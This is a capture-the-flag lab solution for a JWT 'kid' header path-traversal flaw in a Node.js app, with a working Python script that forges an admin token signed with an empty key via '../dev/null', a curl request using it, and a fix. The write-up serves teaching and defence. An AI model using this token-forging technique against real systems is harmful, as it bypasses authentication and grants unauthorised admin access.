# Solution - Lab #5: Wrong Turn

## Root Cause

`index.js` reads the HMAC key from a file path built from the token's `kid` header:

```javascript
const kid     = decoded.header.kid || DEFAULT_KID;
const keyPath = path.join(KEYS_DIR, kid);
const key     = fs.readFileSync(keyPath);
```

There is no check that the resolved path stays inside `KEYS_DIR`. `path.join` collapses `../` sequences, so a crafted `kid` can escape the keys directory and read any file on the server. `/dev/null` is always readable and always returns zero bytes - making the effective HMAC secret an empty Buffer.

## Exploit Steps

### 1. Get a legitimate token

Login as any user and inspect the `session` cookie. The decoded header looks like:

```json
{"alg": "HS256", "typ": "JWT", "kid": "default"}
```

The server reads `keys/default.key` as the HMAC secret. You do not need to know its contents.

### 2. Identify the traversal target

`/dev/null` is a special file that always reads as empty. On Linux (including Alpine in the container):

```bash
$ cat /dev/null | wc -c
0
```

`jsonwebtoken` calls `crypto.createHmac('sha256', key)` where `key` is an empty Buffer. HMAC with an empty key is still valid - it just uses `\x00 * blockSize` internally.

### 3. Forge the token

Craft a JWT with the malicious `kid` and an empty HMAC secret:

```python
import base64, hashlib, hmac, json

def b64url_enc(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

kid    = '../../../../../../dev/null'
secret = b''

header  = b64url_enc(json.dumps({'alg': 'HS256', 'typ': 'JWT', 'kid': kid}, separators=(',', ':')).encode())
payload = b64url_enc(json.dumps({'name': 'hacker', 'role': 'admin'}, separators=(',', ':')).encode())
sig     = b64url_enc(hmac.new(secret, f'{header}.{payload}'.encode(), hashlib.sha256).digest())
token   = f'{header}.{payload}.{sig}'
```

### 4. Capture the flag

```bash
curl http://localhost:3000/api/admin/alerts \
  -H "Cookie: session=<forged_token>"
```

Response:

```json
{
  "flag": "FLAG{k1d_p4th_tr4v3rs4l_null_s3cr3t}",
  "alerts": [...]
}
```

## Automated PoC

```bash
pip install requests pwntools
python poc.py
```

## Takeaway

The `kid` header is attacker-controlled input - never use it as a file path directly. Map allowed key IDs to file paths server-side, or restrict lookups to a known directory using a safelist. A path-traversal guard (e.g. checking that the resolved path starts with `KEYS_DIR`) prevents this entirely.

## References

- [Lab: JWT authentication bypass via kid header path traversal (PortSwigger)](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal) - Lab using `../../../dev/null` as the kid value to force an empty HMAC key
- [The Ultimate Guide to JWT Vulnerabilities - PentesterLab](https://pentesterlab.com/blog/jwt-vulnerabilities-attacks-guide) - End-to-end exploitation walkthroughs including kid path traversal with step-by-step examples
- [jwt_tool Attack Methodology Wiki (ticarpi)](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology) - Tool wiki covering kid injection and filesystem traversal automation
